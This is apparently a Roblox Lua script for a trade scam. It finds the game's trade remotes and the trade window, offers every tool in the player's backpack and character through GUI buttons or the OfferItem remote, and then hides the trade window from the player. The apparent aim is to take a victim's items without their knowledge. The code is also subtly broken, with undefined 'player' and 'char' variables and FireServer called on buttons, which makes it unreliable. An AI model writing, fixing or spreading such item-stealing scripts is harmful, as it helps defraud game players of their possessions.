local RS = game:GetService("ReplicatedStorage")
local Trade = RS:FindFirstChild("Trade")
if not Trade then print("Trade folder not found"); return end

local SendReq = Trade:FindFirstChild("SendRequest")
local AcceptReq = Trade:FindFirstChild("AcceptRequest")
local StartTr = Trade:FindFirstChild("StartTrade")
local AcceptTr = Trade:FindFirstChild("AcceptTrade")
local CompleteTr = Trade:FindFirstChild("CompleteTrade")
local OfferItem = Trade:FindFirstChild("OfferItem")

if not SendReq or not AcceptReq then print("Missing critical remotes"); return end

-- --- HELPER: Find the trade window (large frame or ScreenGui) ---
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    local tradeWindow = nil
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            -- Look for a large Frame or ScreenGui that appears during trade
            if (child:IsA("Frame") or child:IsA("ScreenGui")) then
                local size = child.AbsoluteSize
                if size.X > 200 and size.Y > 200 and child.Visible then
                    -- Check if it contains Accept/Confirm buttons or Add buttons
                    local hasAccept, hasAdd = false, false
                    for _, sub in pairs(child:GetDescendants()) do
                        if sub:IsA("TextButton") then
                            local name = sub.Name:lower()
                            if name:find("accept") or name:find("confirm") then hasAccept = true end
                            if name:find("add") or name:find("select") or name:find("offer") then hasAdd = true end
                        end
                    end
                    if hasAccept and hasAdd then
                        tradeWindow = child
                        return
                    end
                end
            end
            search(child)
        end
    end
    search(gui)
    return tradeWindow
end

-- --- ADD ITEMS: click all "Add" buttons inside the trade window ---
local function addItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0
    -- Look for "Add All" button first
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Name:lower():find("add all") or btn.Name:lower():find("select all") or btn.Name:lower():find("offer all")) then
            pcall(function() btn:FireServer() end)
            print("Clicked Add All button")
            return 1 -- assume it added all
        end
    end
    -- Click each individual "Add" or "Select" button
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add") or name:find("select") or name:find("offer") or name == "+" then
                pcall(function() btn:FireServer() end)
                count = count + 1
                wait(0.05)
            end
        end
    end
    return count
end

-- --- OFFER ITEMS via remote (fallback) ---
local function offerAllViaRemote()
    if not OfferItem then return 0 end
    local offered = 0
    local tools = {}
    -- Get all tools from Backpack and Character
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    print("Found " .. #tools .. " tools in Backpack/Character")
    for _, tool in ipairs(tools) do
        -- Try to get item ID from attributes or from the tool's name
        local itemId = tool:GetAttribute("ItemId") or tool:GetAttribute("ID") or tool.Name
        local ok, err = pcall(function() OfferItem:FireServer(itemId) end)
        if ok then
            offered = offered + 1
            print("Offered: " .. tool.Name)
        else
            -- Try with tool itself
            ok, err = pcall(function() OfferItem:FireServer(tool) end)
            if ok then
                offered = offered + 1
                print("Offered: " .. tool.Name)
            else
                print("Failed to offer " .. tool.Name)
            end
        end
        wait(0.1)
    end
    return offered
end

-- --- HIDE ONLY THE TRADE WINDOW ---
local function hideTradeWindow(tradeWindow)
    if tradeWindow then
        if tradeWindow:IsA("ScreenGui") then
            tradeWindow.Enabled = false
        else
            tradeWindow.Visible = false
        end
        print("Trade window hidden")
    else
        print("No trade window to hide")
    end
end

